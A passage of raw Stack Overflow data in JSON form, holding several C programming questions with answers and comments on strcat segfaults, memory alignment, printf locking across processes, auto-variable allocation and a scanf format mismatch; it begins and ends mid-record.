"https://stackoverflow.com/users/5513684/steven-carlson"}, "edited": false, "score": 2, "creation_date": 1447259984, "post_id": 33655116, "comment_id": 55083998, "body": "It is value of <code>account_id</code>, which is interpreted as address (i hope for you it is valid). If you change <code>folderPositionString</code> to [], yes it will behave differently and just initialize the writable array with this string. But don&#39;t forget to set it&#39;s size to a sufficient number to contain the concatenated string."}, {"owner": {"reputation": 919, "user_id": 5513684, "user_type": "registered", "accept_rate": 92, "profile_image": "https://graph.facebook.com/961769367178033/picture?type=large", "display_name": "Steven Carlson", "link": "https://stackoverflow.com/users/5513684/steven-carlson"}, "edited": false, "score": 1, "creation_date": 1447260110, "post_id": 33655116, "comment_id": 55084072, "body": "Thank you Eugene, that fixed it.  I have updated my question with the finalized code.  Thanks again :)"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 919, "user_id": 5513684, "user_type": "registered", "accept_rate": 92, "profile_image": "https://graph.facebook.com/961769367178033/picture?type=large", "display_name": "Steven Carlson", "link": "https://stackoverflow.com/users/5513684/steven-carlson"}, "edited": false, "score": 1, "creation_date": 1447260222, "post_id": 33655116, "comment_id": 55084134, "body": "Please revert the original question. It is a Q&amp;A site, which means it has to contain valid questions and answers."}], "tags": [], "owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "is_accepted": true, "score": 1, "last_activity_date": 1447259330, "last_edit_date": 1447259330, "creation_date": 1447259271, "answer_id": 33655116, "question_id": 33655082, "link": "https://stackoverflow.com/questions/33655082/c-unknown-segmentation-fault-core-dumped/33655116#33655116", "title": "c unknown Segmentation fault (core dumped)", "body": "<p><code>folderPositionString</code>  is pointing to a read-only memory where the string literal is allocated. When trying to write there additional data you are getting memory access violation.</p>\n\n<p><strong>Update about the update:</strong></p>\n\n<p>In the second case <code>query_string</code> is getting the same address value as <code>account_id</code>, which is presumably pointing to a non-read only memory region. </p>\n"}], "owner": {"reputation": 919, "user_id": 5513684, "user_type": "registered", "accept_rate": 92, "profile_image": "https://graph.facebook.com/961769367178033/picture?type=large", "display_name": "Steven Carlson", "link": "https://stackoverflow.com/users/5513684/steven-carlson"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 39, "favorite_count": 0, "accepted_answer_id": 33655116, "answer_count": 1, "score": 0, "last_activity_date": 1447260174, "creation_date": 1447259180, "last_edit_date": 1447260174, "question_id": 33655082, "link": "https://stackoverflow.com/questions/33655082/c-unknown-segmentation-fault-core-dumped", "title": "c unknown Segmentation fault (core dumped)", "body": "<p>I am getting a Segmentation fault but I do not know why:</p>\n\n<pre><code>    // Assemble folderPositionString\n    char *folderPositionString = \"folders-\";\n    strcat (folderPositionString, \"files\"); \n</code></pre>\n\n<p>In theory this should produce a single char string with 'folders-files' as the value.  I have used strcat before and it works, but for some reason it is not happy here.  </p>\n\n<p>If I comment out the strcat line, everything compiles and works.</p>\n\n<p><strong>Working Code thanks to Eugene</strong></p>\n\n<pre><code>    char folderPositionString [50] = \"folders.\";\n    strcat (folderPositionString, folderPositionRaw);   \n    strcat (folderPositionString, \".files\");\n</code></pre>\n"}, {"tags": ["c++", "c", "alignment", "c99"], "comments": [{"owner": {"reputation": 5077, "user_id": 2327831, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/acb1ec5c15fa33042fa79847c55da18d?s=128&d=identicon&r=PG", "display_name": "this", "link": "https://stackoverflow.com/users/2327831/this"}, "edited": false, "score": 0, "creation_date": 1447258544, "post_id": 33654845, "comment_id": 55082979, "body": "Did you try _Alignas specifier ?"}, {"owner": {"reputation": 17508, "user_id": 1128289, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/9gnmI.jpg?s=128&g=1", "display_name": "Praxeolitic", "link": "https://stackoverflow.com/users/1128289/praxeolitic"}, "reply_to_user": {"reputation": 5077, "user_id": 2327831, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/acb1ec5c15fa33042fa79847c55da18d?s=128&d=identicon&r=PG", "display_name": "this", "link": "https://stackoverflow.com/users/2327831/this"}, "edited": false, "score": 0, "creation_date": 1447258594, "post_id": 33654845, "comment_id": 55083017, "body": "@this oops, I should have mentioned, no C11, thanks"}, {"owner": {"reputation": 5077, "user_id": 2327831, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/acb1ec5c15fa33042fa79847c55da18d?s=128&d=identicon&r=PG", "display_name": "this", "link": "https://stackoverflow.com/users/2327831/this"}, "edited": false, "score": 0, "creation_date": 1447267546, "post_id": 33654845, "comment_id": 55088663, "body": "Why did you accept the other answer if C11 wasn&#39;t an option? :-("}, {"owner": {"reputation": 17508, "user_id": 1128289, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/9gnmI.jpg?s=128&g=1", "display_name": "Praxeolitic", "link": "https://stackoverflow.com/users/1128289/praxeolitic"}, "reply_to_user": {"reputation": 5077, "user_id": 2327831, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/acb1ec5c15fa33042fa79847c55da18d?s=128&d=identicon&r=PG", "display_name": "this", "link": "https://stackoverflow.com/users/2327831/this"}, "edited": false, "score": 0, "creation_date": 1447272669, "post_id": 33654845, "comment_id": 55091534, "body": "@this I didn&#39;t pick it for <code>_Alignas</code> but for the suggestion in the last paragraph to use an extension since it&#39;s the only way to get arbitrary alignments that might not match an existing type. Even though it&#39;s non-standard it&#39;s the only available solution and it is widely supported. I was torn about the decision though, both answers are good."}], "answers": [{"tags": [], "owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "is_accepted": true, "score": 5, "last_activity_date": 1447258959, "creation_date": 1447258959, "answer_id": 33655024, "question_id": 33654845, "link": "https://stackoverflow.com/questions/33654845/equivalent-of-stdaligned-storage-in-c/33655024#33655024", "title": "Equivalent of std::aligned_storage&lt;&gt; in C?", "body": "<p>In C2011, there are the <a href=\"http://en.cppreference.com/w/c/language/_Alignas\"><code>_Alignas</code></a> and <a href=\"http://en.cppreference.com/w/c/language/_Alignof\"><code>_Alignof</code></a> keywords, the header <code>&lt;stdalign.h&gt;</code> which makes their use slightly less ugly, and the type <a href=\"http://en.cppreference.com/w/c/types/max_align_t\"><code>max_align_t</code></a> (which is in <code>&lt;stddef.h&gt;</code>).  You can, for instance, write</p>\n\n<pre><code>double _Alignas(4*_Alignof(double)) dvector[16];\n</code></pre>\n\n<p>to request an array of 16 <code>double</code> quantities aligned to 4x the usual alignment for <code>double</code>, as might be necessary for use with CPU-specific vector instructions.  This is not guaranteed to work on all implementations, but if it doesn't work it's guaranteed to be a compile-time error.</p>\n\n<p>Prior to C2011 there was no <em>standard</em> way to do this, but many compilers did have extensions with similar functionality, e.g. GCC's <a href=\"https://gcc.gnu.org/onlinedocs/gcc-4.8.1/gcc/Variable-Attributes.html#Variable-Attributes\"><code>__attribute__ (aligned)</code></a> construct.</p>\n"}, {"tags": [], "owner": {"reputation": 5077, "user_id": 2327831, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/acb1ec5c15fa33042fa79847c55da18d?s=128&d=identicon&r=PG", "display_name": "this", "link": "https://stackoverflow.com/users/2327831/this"}, "is_accepted": false, "score": 5, "last_activity_date": 1447259555, "last_edit_date": 1447259555, "creation_date": 1447259028, "answer_id": 33655044, "question_id": 33654845, "link": "https://stackoverflow.com/questions/33654845/equivalent-of-stdaligned-storage-in-c/33655044#33655044", "title": "Equivalent of std::aligned_storage&lt;&gt; in C?", "body": "<p>Well unions come to mind.</p>\n\n<pre><code>union This\n{\n    int integer;\n    align_type alignment;\n} ;\n</code></pre>\n\n<p>There is no padding before members in unions. So if you declare an automatic variable <code>union This</code>, then it, and all of its members, should be aligned the same as is alignment of the member with the highest alignment.</p>\n"}], "owner": {"reputation": 17508, "user_id": 1128289, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/9gnmI.jpg?s=128&g=1", "display_name": "Praxeolitic", "link": "https://stackoverflow.com/users/1128289/praxeolitic"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 127, "favorite_count": 0, "accepted_answer_id": 33655024, "answer_count": 2, "score": 8, "last_activity_date": 1447259555, "creation_date": 1447258404, "last_edit_date": 1447258796, "question_id": 33654845, "link": "https://stackoverflow.com/questions/33654845/equivalent-of-stdaligned-storage-in-c", "title": "Equivalent of std::aligned_storage&lt;&gt; in C?", "body": "<p>In C, is there a way to get over-aligned (i.e. more alignment than can be deduced from the type system) storage on the stack?</p>\n\n<p>For variables in dynamically allocated memory we can always align manually if all else fails but what can be done for variables in automatically allocated memory?</p>\n\n<p>I guess it's possible to use a <code>char[size + alignment - 1]</code> and then always use bit manipulation to access the variable but this seems a \"bit\" shadier than necessary (har har har ;)).</p>\n"}, {"tags": ["c", "multithreading", "thread-safety", "printf", "posix"], "comments": [{"owner": {"reputation": 165655, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 0, "creation_date": 1447367331, "post_id": 33654673, "comment_id": 55138223, "body": "You should <code>fflush</code> before you <code>sem_post</code>."}, {"owner": {"reputation": 95, "user_id": 5175440, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/f2500b7d6bd8e680ff2f21bd1afeb5d2?s=128&d=identicon&r=PG&f=1", "display_name": "Simon", "link": "https://stackoverflow.com/users/5175440/simon"}, "reply_to_user": {"reputation": 165655, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 0, "creation_date": 1447367382, "post_id": 33654673, "comment_id": 55138256, "body": "@Schwartz i have tried it too, but same result"}, {"owner": {"reputation": 165655, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 0, "creation_date": 1447373620, "post_id": 33654673, "comment_id": 55140544, "body": "You seem to have tried to split the difference between named and unnamed semaphores."}, {"owner": {"reputation": 95, "user_id": 5175440, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/f2500b7d6bd8e680ff2f21bd1afeb5d2?s=128&d=identicon&r=PG&f=1", "display_name": "Simon", "link": "https://stackoverflow.com/users/5175440/simon"}, "reply_to_user": {"reputation": 165655, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 0, "creation_date": 1447398717, "post_id": 33654673, "comment_id": 55147212, "body": "I&#39;m working on xCode, and &#39;sem_init()&#39; for unnamed semaphore is deprecated. I just tried the named ones, but i have the same result. I know that is unnecessary create a shared memory for named sem, but with or without it, the result is the same. I just want to know why"}], "answers": [{"comments": [{"owner": {"reputation": 95, "user_id": 5175440, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/f2500b7d6bd8e680ff2f21bd1afeb5d2?s=128&d=identicon&r=PG&f=1", "display_name": "Simon", "link": "https://stackoverflow.com/users/5175440/simon"}, "edited": false, "score": 0, "creation_date": 1447258989, "post_id": 33654766, "comment_id": 55083304, "body": "So, i have to use <code>pthread_mutex_t</code>??  EDIT: Sorry, i have read now the link!! Is there another way to lock stdout for processes and threads?"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "reply_to_user": {"reputation": 95, "user_id": 5175440, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/f2500b7d6bd8e680ff2f21bd1afeb5d2?s=128&d=identicon&r=PG&f=1", "display_name": "Simon", "link": "https://stackoverflow.com/users/5175440/simon"}, "edited": false, "score": 1, "creation_date": 1447265923, "post_id": 33654766, "comment_id": 55087602, "body": "@Simon If you lock acces for processes, that will lock it for threads as well."}, {"owner": {"reputation": 165655, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 0, "creation_date": 1447368277, "post_id": 33654766, "comment_id": 55138653, "body": "@JoachimPileborg This is not true. For example, <code>flock</code> locks will do terrible things if you try to use them to lock between threads."}], "tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": false, "score": 2, "last_activity_date": 1447258170, "creation_date": 1447258170, "answer_id": 33654766, "question_id": 33654673, "link": "https://stackoverflow.com/questions/33654673/c-printf-not-thread-safe-with-flockfile/33654766#33654766", "title": "C : printf() not thread safe with flockfile()", "body": "<p>The <a href=\"http://man7.org/linux/man-pages/man3/flockfile.3.html\" rel=\"nofollow\"><code>flockfile</code></a> function is for locking for other <em>threads</em>, not processes. If you want inter-process locking look at e.g. <a href=\"http://man7.org/linux/man-pages/man7/sem_overview.7.html\" rel=\"nofollow\">POSIX semaphores</a>, especially the named ones.</p>\n"}], "owner": {"reputation": 95, "user_id": 5175440, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/f2500b7d6bd8e680ff2f21bd1afeb5d2?s=128&d=identicon&r=PG&f=1", "display_name": "Simon", "link": "https://stackoverflow.com/users/5175440/simon"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 781, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1447364932, "creation_date": 1447257898, "last_edit_date": 1447364932, "question_id": 33654673, "link": "https://stackoverflow.com/questions/33654673/c-printf-not-thread-safe-with-flockfile", "title": "C : printf() not thread safe with flockfile()", "body": "<p>I need to print some messages on screen, and my program is multiprocess and multithread. I used <code>flockfile()</code>, <code>flock()</code> and mutex, but some messages are overlapped. I did also a basic test program, and the result is the same. Why i cannot synchronize the output?</p>\n\n<pre><code>void my_printf() {\n    int i;\n    for (i=0; i&lt;20000; ++i) {\n        flockfile(stdout);\n        printf(\"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\\n\");\n        fflush(stdout);\n        funlockfile(stdout);\n    }\n}\n\n\nint main()\n{\n    fork();\n    fork();\n    fork();\n    my_printf();\n    exit(0);\n}\n</code></pre>\n\n<p>EDIT</p>\n\n<p>@Joachim Pileborg\nI have tried to use <code>sem_t</code> semaphores, but i had the same result...strings are overlapped.</p>\n\n<pre><code>struct my_struct {\n    sem_t *t;\n};\n\nstruct my_struct *create_shared_memory(void)\n{\n    struct my_struct *str;\n    key_t key;\n    int fd;\n\n    key = ftok(\"/\", '5');\n    fd = shmget(key, sizeof(struct my_struct), IPC_CREAT|0666);\n    str = shmat(fd, NULL, 0);\n    str-&gt;t = sem_open(\"/my_sem\", O_CREAT|O_EXCL, 0644, 1);\n\n    return str;\n}\n\nvoid my_printf(struct my_struct *str){\n    int i;\n    for (i=0; i&lt;20000; ++i) {\n        sem_wait(str-&gt;t);\n        printf(\"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\\n\");\n        sem_post(str-&gt;t);\n        fflush(stdout);\n    }\n}\n\n\nint main()\n{\n    struct my_struct *my = create_shared_memory();\n    fork();\n    fork();\n    my_printf(my);\n\n    exit(0);\n}\n</code></pre>\n"}, {"tags": ["c", "memory", "assembly", "compiler-optimization", "dynamic-allocation"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1447257915, "post_id": 33654641, "comment_id": 55082559, "body": "Not necessarily. It&#39;s just to limit the scope."}, {"owner": {"reputation": 2138, "user_id": 600641, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/c60af2cd46678a4657058110d6488454?s=128&d=identicon&r=PG", "display_name": "kirugan", "link": "https://stackoverflow.com/users/600641/kirugan"}, "reply_to_user": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1447258098, "post_id": 33654641, "comment_id": 55082671, "body": "@SouravGhosh even if I call this function very ofthen (when y = 0) ?"}, {"owner": {"reputation": 2138, "user_id": 600641, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/c60af2cd46678a4657058110d6488454?s=128&d=identicon&r=PG", "display_name": "kirugan", "link": "https://stackoverflow.com/users/600641/kirugan"}, "reply_to_user": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1447258200, "post_id": 33654641, "comment_id": 55082731, "body": "maybe there is some hint to compiler similar to <code>likely</code>, <code>unlikely</code> ?"}, {"owner": {"reputation": 142904, "user_id": 1708801, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/01b9a608af886840fcf05fcfd9b5dc27?s=128&d=identicon&r=PG", "display_name": "Shafik Yaghmour", "link": "https://stackoverflow.com/users/1708801/shafik-yaghmour"}, "edited": false, "score": 1, "creation_date": 1447258298, "post_id": 33654641, "comment_id": 55082810, "body": "What the compiler will do, will vary greatly with optimization levels(<i>and of course the compiler</i>), see <a href=\"http://goo.gl/g7CkQC\" rel=\"nofollow noreferrer\">this godbolt</a> and vary <code>-O0</code> to <code>-O3</code>"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1447258374, "post_id": 33654641, "comment_id": 55082866, "body": "@kirugan Nothing you can be certain of!! :)"}], "answers": [{"tags": [], "owner": {"reputation": 85822, "user_id": 597607, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jCzJi.png?s=128&g=1", "display_name": "Bo Persson", "link": "https://stackoverflow.com/users/597607/bo-persson"}, "is_accepted": true, "score": 2, "last_activity_date": 1447259207, "creation_date": 1447259207, "answer_id": 33655091, "question_id": 33654641, "link": "https://stackoverflow.com/questions/33654641/lazy-creation-of-auto-variables-inside-c-function/33655091#33655091", "title": "Lazy creation of auto variables inside C function", "body": "<p>A more likely optimization by the compiler is</p>\n\n<pre><code>void test(int y){\n   if (y) {\n      printf(\"Test: %d\", 1 + y);\n   }\n   // other important code (don`t use x var)\n}\n</code></pre>\n\n<p>and then we don't need <code>x</code> in either case.</p>\n"}, {"tags": [], "owner": {"reputation": 142904, "user_id": 1708801, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/01b9a608af886840fcf05fcfd9b5dc27?s=128&d=identicon&r=PG", "display_name": "Shafik Yaghmour", "link": "https://stackoverflow.com/users/1708801/shafik-yaghmour"}, "is_accepted": false, "score": 0, "last_activity_date": 1447259887, "last_edit_date": 1447259887, "creation_date": 1447259245, "answer_id": 33655103, "question_id": 33654641, "link": "https://stackoverflow.com/questions/33654641/lazy-creation-of-auto-variables-inside-c-function/33655103#33655103", "title": "Lazy creation of auto variables inside C function", "body": "<p>What the compiler does will vary based on optimization level but one would expect at the highest optimization level a modern compiler would do everything in registers with <code>x</code> being constant folded away since it is a constant <code>1</code> and we can see from <a href=\"http://goo.gl/87NCqH\" rel=\"nofollow\">this godbolt session</a> gcc does just that:</p>\n\n<pre><code>test:\n    testl   %edi, %edi\n    jne .L4\n    rep ret\n.L4:\n    leal    1(%rdi), %esi\n    xorl    %eax, %eax\n    movl    $.LC0, %edi\n    jmp printf\n</code></pre>\n\n<p>at the lowest optimization level we don't expect anything clever and in this case gcc allocates for both <code>x</code> and <code>y</code> without checking if <code>x</code> is actually required:</p>\n\n<pre><code>subq    $32, %rsp\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 9530, "user_id": 5264491, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/233d38e551f3f0f85437e4ae47353d25?s=128&d=identicon&r=PG&f=1", "display_name": "Ian Abbott", "link": "https://stackoverflow.com/users/5264491/ian-abbott"}, "edited": false, "score": 0, "creation_date": 1447264384, "post_id": 33655259, "comment_id": 55086675, "body": "Also, an auto variable might not stay in the same place in the stack frame throughout the execution of the function. If the value of a variable changes, the compiler might decide to keep the value somewhere else and use the old storage location for something else. It only really needs to pin it down while something is pointing to it."}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "reply_to_user": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1447330527, "post_id": 33655259, "comment_id": 55115095, "body": "@Sourav-Ghosh, oops...sorry, corrected the spelling."}], "tags": [], "owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "is_accepted": false, "score": 1, "last_activity_date": 1447330483, "last_edit_date": 1447330483, "creation_date": 1447259652, "answer_id": 33655259, "question_id": 33654641, "link": "https://stackoverflow.com/questions/33654641/lazy-creation-of-auto-variables-inside-c-function/33655259#33655259", "title": "Lazy creation of auto variables inside C function", "body": "<p>As Sourav Ghosh says, \"Nothing you can be certain of!\", however, let me give some possibilities a compiler might use.</p>\n\n<p>First, syntactically speaking, a variable in a block only is known within the block. Outside the block the compiler (language) has forgotten all about it. So you can use this block construct to have a temporary variable.</p>\n\n<p>What can the compiler do?</p>\n\n<p>Probably a compiler will calculate the maximum storage of all blocks (that is, the automatic variables declared upon function entry (function scope) plus the size of the largest block, plus the size of the largest nested block,... etc.) and allocate that amount on the stack. When a block is exited, the compiler knows its variables do not exist anymore and can re-use that space (on the stack) for any following block. In Fortran this is called an overlay and it is comparible to a union in C.</p>\n\n<p>Equally posible, a compiler might allocate new space on the stack (e.g. <code>sub sp, 12</code>) upon entering a block, and release it upon leaving the block (e.g. <code>add sp, 12</code>).</p>\n\n<p>And there may be other strategies that I don't know of.</p>\n"}], "owner": {"reputation": 2138, "user_id": 600641, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/c60af2cd46678a4657058110d6488454?s=128&d=identicon&r=PG", "display_name": "kirugan", "link": "https://stackoverflow.com/users/600641/kirugan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 75, "favorite_count": 0, "accepted_answer_id": 33655091, "answer_count": 3, "score": 1, "last_activity_date": 1489866458, "creation_date": 1447257812, "last_edit_date": 1489866458, "question_id": 33654641, "link": "https://stackoverflow.com/questions/33654641/lazy-creation-of-auto-variables-inside-c-function", "title": "Lazy creation of auto variables inside C function", "body": "<p>I`m curious about such C code:</p>\n\n<pre><code>void test(int y){\n   if (y) {\n      int x = 1;\n      printf(\"Test: %d\", x + y);\n   }\n   // other important code (don`t use x var)\n}\n</code></pre>\n\n<p>Necessity of <code>x</code> variable depends on <code>y</code>. \nFor instance: if we call <code>test(0)</code>, we don't need to allocate space for <code>x</code> variable, for <code>test(1)</code> invocation <code>x</code> variable must exist in memory. </p>\n\n<p>Does this kind of technique used by modern compilers?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 42446, "user_id": 902497, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff13ece6277497484bfa2911c6183a30?s=128&d=identicon&r=PG", "display_name": "Raymond Chen", "link": "https://stackoverflow.com/users/902497/raymond-chen"}, "edited": false, "score": 0, "creation_date": 1447257908, "post_id": 33654568, "comment_id": 55082556, "body": "What did you discover when you tried debugging the program? Hint: look at <code>N</code>."}, {"owner": {"reputation": 657, "user_id": 5440452, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/609964d12cea609c4df487ccd4ae1f73?s=128&d=identicon&r=PG&f=1", "display_name": "hexasoft", "link": "https://stackoverflow.com/users/5440452/hexasoft"}, "edited": false, "score": 0, "creation_date": 1447257970, "post_id": 33654568, "comment_id": 55082598, "body": "why do you have both xPtr and R? You seems to use them the same (i.e. printing &quot;R[%d]&quot; but using *(xPtr+i)"}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1447277958, "post_id": 33654568, "comment_id": 55094237, "body": "Seems like a lot of complex code just to add input numbers into an accumulator:("}], "answers": [{"comments": [{"owner": {"reputation": 657, "user_id": 5440452, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/609964d12cea609c4df487ccd4ae1f73?s=128&d=identicon&r=PG&f=1", "display_name": "hexasoft", "link": "https://stackoverflow.com/users/5440452/hexasoft"}, "edited": false, "score": 0, "creation_date": 1447258035, "post_id": 33654691, "comment_id": 55082632, "body": "And compile with warnings. This kind of problem is printed at compilation stage."}, {"owner": {"reputation": 19358, "user_id": 3049655, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/ZLzeP.jpg?s=128&g=1", "display_name": "Spikatrix", "link": "https://stackoverflow.com/users/3049655/spikatrix"}, "reply_to_user": {"reputation": 657, "user_id": 5440452, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/609964d12cea609c4df487ccd4ae1f73?s=128&d=identicon&r=PG&f=1", "display_name": "hexasoft", "link": "https://stackoverflow.com/users/5440452/hexasoft"}, "edited": false, "score": 0, "creation_date": 1447258462, "post_id": 33654691, "comment_id": 55082918, "body": "Yes. Correct. I&#39;ve added that to the answer. Thanks."}], "tags": [], "owner": {"reputation": 19358, "user_id": 3049655, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/ZLzeP.jpg?s=128&g=1", "display_name": "Spikatrix", "link": "https://stackoverflow.com/users/3049655/spikatrix"}, "is_accepted": false, "score": 1, "last_activity_date": 1447258395, "last_edit_date": 1495540316, "creation_date": 1447257947, "answer_id": 33654691, "question_id": 33654568, "link": "https://stackoverflow.com/questions/33654568/why-is-my-program-not-properly-working-for-c/33654691#33654691", "title": "Why is my program not properly working for C?", "body": "<p>Here:</p>\n\n<pre><code>scanf(\"%d\", &amp;N);\n</code></pre>\n\n<p><code>N</code> is of type <code>float</code> and so, <code>&amp;N</code> is of type <code>float*</code>. But <code>%d</code> expects an <code>int*</code>, not a <code>float*</code>. This invokes <em>Undefined Behavior</em>.</p>\n\n<p>Fix it by either changing the format specifier to <code>%f</code> or by changing the type of <code>N</code> to <code>int</code>.</p>\n\n<hr>\n\n<p>BTW, it doesn't make sense why you pass <code>N</code> to the function instead of declaring it in the function. Also, there is no need for <code>xPtr</code>. You can directly use <code>R</code> instead of <code>xPtr</code>.</p>\n\n<hr>\n\n<p>You would've noticed the problem if you had compiled with warnings (at least with <code>-Wall</code>) as <a href=\"https://stackoverflow.com/users/5440452/hexasoft\">@hexasoft</a> <a href=\"https://stackoverflow.com/questions/33654568/why-is-my-program-not-properly-working-for-c/33654691#comment55082632_33654691\">has said below</a>. GCC gives:</p>\n\n<pre><code>source_file.c: In function 